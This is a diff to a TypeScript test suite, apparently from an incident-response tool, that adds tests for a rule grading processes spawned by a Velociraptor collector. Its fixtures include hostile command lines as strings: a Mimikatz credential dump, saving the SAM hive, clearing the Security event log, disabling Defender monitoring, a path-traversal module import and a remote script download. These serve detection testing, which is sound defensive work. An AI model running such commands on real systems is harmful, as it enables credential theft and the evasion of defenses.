@@ -14,6 +14,7 @@ import {
   isCollectorFootprint,
   isCollectorInstallBinary,
   isCollectorServerDestination,
+  isCollectorServiceChild,
   isCollectorSpawn,
   isForeignDestination,
   isLocalOrUnspecifiedHost,
@@ -1112,17 +1113,58 @@ describe("isCollectorSpawn — a process the Velociraptor client itself started"
     }
   });
 
-  it("does NOT match a collector parent whose command line names no Tools-root file", () => {
+  it("a collector parent whose command line names no Tools-root file is not a rule 2c spawn", () => {
     for (const cmd of [
       "powershell -ExecutionPolicy bypass -command Invoke-Mimikatz -DumpCreds",
       'powershell -c "import-module C:\\ProgramData\\Velociraptor\\Tools\\tmp1\\x.psm1"',
       "powershell -c \"import-module 'C:\\Program Files\\Velociraptor\\Tools\\..\\..\\evil.psm1'\"",
+    ])
+      expect(isCollectorSpawn(spawn({ cmd }))).toBe(false);
+  });
+
+  // Rule 2d (#1593): any SYSTEM process the client started is the collector's — the inline klist
+  // collection script on INC-2026-005 graded High "PowerShell Command Line Obfuscation".
+  it("rule 2d: an inline collection script the client ran as SYSTEM grades Info, claimed alone", () => {
+    const klist =
+      'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$sess=(& klist sessions 2>&1 | Out-String); $out | ConvertTo-Json"';
+    const m = spawn({ cmd: klist, severity: "High" });
+    expect(isCollectorSpawn(m)).toBe(false); // not a lineage seed
+    expect(isCollectorServiceChild(m)).toBe(true);
+    annotateCollectorDeployment(m, { servers: new Set() });
+    expect(m.severity).toBe("Info");
+    expect(m.origin).toBe("collector");
+    expect(m.description).toMatch(
+      /\[DFIR collector footprint — SYSTEM process the Velociraptor client started\]$/,
+    );
+  });
+
+  it("rule 2d refuses strong tradecraft, a foreign URL, a non-SYSTEM user, a foreign parent and a Critical", () => {
+    for (const cmd of [
+      "powershell -ExecutionPolicy bypass -command Invoke-Mimikatz -DumpCreds",
+      "cmd.exe /c reg save hklm\\sam C:\\Windows\\Temp\\s.hiv",
+      "wevtutil cl Security",
+      // Strong in the importer's tradecraft tables, not in STRONG_CMD (Codex, review of #1593).
+      "powershell -c Set-MpPreference -DisableRealtimeMonitoring $true",
+      "powershell -c Add-MpPreference -ExclusionPath C:\\Users\\Public",
     ]) {
-      const m = spawn({ cmd });
-      expect(isCollectorSpawn(m)).toBe(false);
+      const m = spawn({ cmd, image: cmd.startsWith("powershell") ? PWSH : "C:\\Windows\\System32\\cmd.exe" });
+      expect(isCollectorServiceChild(m)).toBe(false);
       annotateCollectorDeployment(m, { servers: new Set() });
       expect(m.severity).toBe("Medium");
+      expect(m.origin).toBeUndefined();
     }
+    const url = spawn({ cmd: "powershell -c iwr http://203.0.113.9/a.ps1" });
+    annotateCollectorDeployment(url, { servers: new Set([SERVER]) });
+    expect(url.severity).toBe("Medium");
+    const user = spawn({ cmd: "powershell -c Get-Date", user: "WS01\\vagrant" });
+    annotateCollectorDeployment(user, { servers: new Set() });
+    expect(user.severity).toBe("Medium");
+    const parent = spawn({ cmd: "powershell -c Get-Date", parent: "C:\\Users\\Public\\Velociraptor.exe" });
+    annotateCollectorDeployment(parent, { servers: new Set() });
+    expect(parent.severity).toBe("Medium");
+    const critical = spawn({ cmd: "powershell -c Get-Date", severity: "Critical" });
+    annotateCollectorDeployment(critical, { servers: new Set() });
+    expect(critical.severity).toBe("Critical");
   });
 
   // A parent can be CHOSEN (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS) and Sysmon records the chosen
